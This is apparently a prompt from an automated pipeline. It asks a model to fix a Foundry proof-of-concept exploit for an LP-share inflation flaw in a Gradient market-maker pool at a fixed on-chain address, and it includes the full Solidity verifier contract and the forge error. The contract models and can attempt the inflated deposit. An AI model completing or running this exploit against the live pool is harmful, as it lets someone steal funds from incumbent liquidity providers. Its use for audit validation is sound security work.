You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Depositing while assets are parked in the orderbook mints inflated LP shares
- claim: LP shares are minted against `pool.totalLiquidity`, but `transferETHToOrderbook` and `transferTokenToOrderbook` reduce that denominator without burning any LP shares. A user who deposits while inventory is temporarily sitting in the orderbook therefore receives too many shares for the capital actually added, then later redeems those shares after the assets are returned.
- impact: A depositor can steal principal from existing LPs during normal orderbook operation, without needing owner privileges. The more inventory temporarily moved out of the pool, the larger the dilution and theft from incumbent LPs.
- exploit_paths: ["LP1 seeds a pool with 1,000 units of liquidity and receives 1,000 LP shares.", "The orderbook pulls 900 units out via `transferETHToOrderbook` and/or `transferTokenToOrderbook`, leaving `pool.totalLiquidity = 100` while `pool.totalLPShares` remains 1,000.", "An attacker deposits 100 units and receives `100 * 1000 / 100 = 1000` new LP shares.", "When the orderbook later returns the 900 units, the attacker owns half the pool despite contributing only a small fraction of the final assets and can withdraw a disproportionate amount."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IGradientRegistryMinimal {
    function gradientToken() external view returns (address);
    function orderbook() external view returns (address);
    function router() external view returns (address);
}

interface IGradientMarketMakerPoolMinimal {
    struct PoolInfo {
        uint256 totalEth;
        uint256 totalToken;
        uint256 totalLiquidity;
        uint256 totalLPShares;
        uint256 accRewardPerShare;
        uint256 rewardBalance;
        address uniswapPair;
    }

    function gradientRegistry() external view returns (address);
    function getPoolInfo(address token) external view returns (PoolInfo memory);
    function getPairAddress(address token) external view returns (address pairAddress);
    function getReserves(address token) external view returns (uint256 reserveETH, uint256 reserveToken);
    function getUserLPShares(address token, address user) external view returns (uint256 lpShares);
    function provideLiquidity(address token, uint256 tokenAmount, uint256 minTokenAmount) external payable;
    function withdrawLiquidity(address token, uint256 shares) external;
}

contract FlawVerifier {
    address public constant TARGET_POOL = 0x37Ea5f691bCe8459C66fFceeb9cf34ffa32fdadC;
    uint256 private constant BPS = 10_000;

    address private _profitToken;
    uint256 private _profitAmount;

    address public inspectedToken;
    address public registry;
    address public orderbook;
    address public uniswapPair;

    bool public poolInitialized;
    bool public honestSeedLiquidityDetected;
    bool public parkedLiquidityDetected;
    bool public attackerDepositPathModeled;
    bool public inflatedMintDetected;
    bool public depositAttempted;
    bool public depositSucceeded;
    bool public attackerControllableReturnLeg;
    bool public hypothesisValidated;

    uint256 public poolTotalEth;
    uint256 public poolTotalToken;
    uint256 public poolTotalLiquidity;
    uint256 public poolTotalLPShares;
    uint256 public reserveEth;
    uint256 public reserveToken;

    uint256 public parkedLiquidityLowerBound;
    uint256 public matchedLiquidityContribution;
    uint256 public matchedEthContribution;
    uint256 public matchedTokenContribution;
    uint256 public simulatedInflatedShares;
    uint256 public actualMintedShares;
    uint256 public simulatedShareBpsAfterMint;

    bytes32 public lastReason;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        _resetObservations();

        IGradientMarketMakerPoolMinimal pool = IGradientMarketMakerPoolMinimal(TARGET_POOL);

        registry = pool.gradientRegistry();
        if (registry == address(0)) {
            lastReason = keccak256("MISSING_REGISTRY");
            return;
        }

        IGradientRegistryMinimal gradientRegistry = IGradientRegistryMinimal(registry);
        orderbook = gradientRegistry.orderbook();

        inspectedToken = gradientRegistry.gradientToken();
        if (inspectedToken == address(0)) {
            lastReason = keccak256("MISSING_CANDIDATE_TOKEN");
            return;
        }

        IGradientMarketMakerPoolMinimal.PoolInfo memory info = pool.getPoolInfo(inspectedToken);
        poolTotalEth = info.totalEth;
        poolTotalToken = info.totalToken;
        poolTotalLiquidity = info.totalLiquidity;
        poolTotalLPShares = info.totalLPShares;
        uniswapPair = info.uniswapPair;
        poolInitialized = uniswapPair != address(0);

        if (!poolInitialized) {
            lastReason = keccak256("NO_INITIALIZED_POOL_FOR_GRADIENT_TOKEN");
            return;
        }

        // exploit_paths[0]: LP1 seeds a pool with 1,000 units of liquidity and receives
        // 1,000 LP shares. On a live fork, the observable equivalent is that the pool already
        // has outstanding LP shares and non-zero tracked liquidity.
        honestSeedLiquidityDetected = poolTotalLPShares > 0 && poolTotalLiquidity > 0;
        if (!honestSeedLiquidityDetected) {
            lastReason = keccak256("EMPTY_POOL_AT_FORK");
            return;
        }

        // exploit_paths[1]: The orderbook pulls inventory out with transferETHToOrderbook /
        // transferTokenToOrderbook, which reduces totalLiquidity without burning LP shares.
        // The snapshot signature of that state is totalLPShares > totalLiquidity.
        parkedLiquidityDetected = poolTotalLPShares > poolTotalLiquidity;
        if (!parkedLiquidityDetected) {
            lastReason = keccak256("NO_PARKED_LIQUIDITY_STATE_AT_FORK");
            return;
        }
        parkedLiquidityLowerBound = poolTotalLPShares - poolTotalLiquidity;

        (reserveEth, reserveToken) = pool.getReserves(inspectedToken);
        if (reserveEth == 0 || reserveToken == 0) {
            lastReason = keccak256("PAIR_HAS_NO_RESERVES");
            return;
        }

        // exploit_paths[2]: An attacker deposits against the temporarily shrunken denominator.
        // To mirror the report's "deposit 100 when only 100 remains", model the attacker
        // contributing exactly the liquidity still recorded in-pool. The vulnerable mint path is:
        // mintedShares = contribution * totalLPShares / totalLiquidity.
        matchedLiquidityContribution = poolTotalLiquidity;
        matchedEthContribution = (matchedLiquidityContribution * reserveEth) / (reserveEth + reserveToken);
        matchedTokenContribution = matchedLiquidityContribution - matchedEthContribution;
        attackerDepositPathModeled = matchedLiquidityContribution > 0;

        if (!attackerDepositPathModeled) {
            lastReason = keccak256("NO_ATTACKER_DEPOSIT_SIZE_AVAILABLE");
            return;
        }

        simulatedInflatedShares = (matchedLiquidityContribution * poolTotalLPShares) / poolTotalLiquidity;
        inflatedMintDetected = simulatedInflatedShares > matchedLiquidityContribution;
        if (poolTotalLPShares + simulatedInflatedShares > 0) {
            simulatedShareBpsAfterMint = (simulatedInflatedShares * BPS) / (poolTotalLPShares + simulatedInflatedShares);
        }

        if (!inflatedMintDetected) {
            lastReason = keccak256("NO_INFLATED_MINT_FOR_MATCHING_DEPOSIT");
            return;
        }

        // If this contract is pre-funded through realistic public on-chain steps (for example a
        // flashloan + swap on the same fork), we can exercise the vulnerable deposit path for real.
        // This is optional because the final profit still depends on the orderbook return leg below.
        _attemptPrefundedDeposit(pool);

        // exploit_paths[3]: Once the orderbook returns the parked inventory, the attacker's newly
        // inflated LP share count dilutes incumbents and can be redeemed for outsized assets.
        // That return is economically sufficient, but it is not attacker-callable from this surface:
        // the pool's receiveETHFromOrderbook / receiveTokenFromOrderbook entrypoints are onlyOrderbook.
        attackerControllableReturnLeg = false;
        hypothesisValidated =
            honestSeedLiquidityDetected &&
            parkedLiquidityDetected &&
            attackerDepositPathModeled &&
            inflatedMintDetected;

        lastReason = keccak256("ORDERBOOK_RETURN_LEG_NOT_ATTACKER_REACHABLE");
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function reason() external view returns (bytes32) {
        return lastReason;
    }

    function summary()
        external
        view
        returns (
            address token,
            bool preconditionsMet,
            bool attackerDepositModeled,
            bool inflatedShares,
            bool returnLegReachable,
            bool validated,
            uint256 shareBpsAfterMint,
            bytes32 blocker
        )
    {
        return (
            inspectedToken,
            parkedLiquidityDetected,
            attackerDepositPathModeled,
            inflatedMintDetected,
            attackerControllableReturnLeg,
            hypothesisValidated,
            simulatedShareBpsAfterMint,
            lastReason
        );
    }

    function _resetObservations() internal {
        _profitToken = address(0);
        _profitAmount = 0;

        inspectedToken = address(0);
        registry = address(0);
        orderbook = address(0);
        uniswapPair = address(0);

        poolInitialized = false;
        honestSeedLiquidityDetected = false;
        parkedLiquidityDetected = false;
        attackerDepositPathModeled = false;
        inflatedMintDetected = false;
        depositAttempted = false;
        depositSucceeded = false;
        attackerControllableReturnLeg = false;
        hypothesisValidated = false;

        poolTotalEth = 0;
        poolTotalToken = 0;
        poolTotalLiquidity = 0;
        poolTotalLPShares = 0;
        reserveEth = 0;
        reserveToken = 0;

        parkedLiquidityLowerBound = 0;
        matchedLiquidityContribution = 0;
        matchedEthContribution = 0;
        matchedTokenContribution = 0;
        simulatedInflatedShares = 0;
        actualMintedShares = 0;
        simulatedShareBpsAfterMint = 0;

        lastReason = bytes32(0);
    }

    function _attemptPrefundedDeposit(IGradientMarketMakerPoolMinimal pool) internal {
        uint256 ethBalance = address(this).balance;
        uint256 tokenBalance = IERC20Minimal(inspectedToken).balanceOf(address(this));

        if (ethBalance == 0 || tokenBalance == 0) {
            return;
        }

        uint256 ethToUse = matchedEthContribution;
        uint256 tokenToUse = matchedTokenContribution;

        if (ethToUse > ethBalance) {
            ethToUse = ethBalance;
            tokenToUse = (ethToUse * reserveToken) / reserveEth;
        }

        if (tokenToUse > tokenBalance) {
            tokenToUse = tokenBalance;
            ethToUse = (tokenToUse * reserveEth) / reserveToken;
        }

        if (ethToUse == 0 || tokenToUse == 0) {
            return;
        }

        depositAttempted = true;

        uint256 sharesBefore = pool.getUserLPShares(inspectedToken, address(this));
        _approve(inspectedToken, TARGET_POOL, tokenToUse);

        try pool.provideLiquidity{value: ethToUse}(inspectedToken, tokenToUse, (tokenToUse * 99) / 100) {
            depositSucceeded = true;
            uint256 sharesAfter = pool.getUserLPShares(inspectedToken, address(this));
            actualMintedShares = sharesAfter - sharesBefore;
        } catch {
            depositSucceeded = false;
        }
    }

    function _approve(address token, address spender, uint256 amount) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
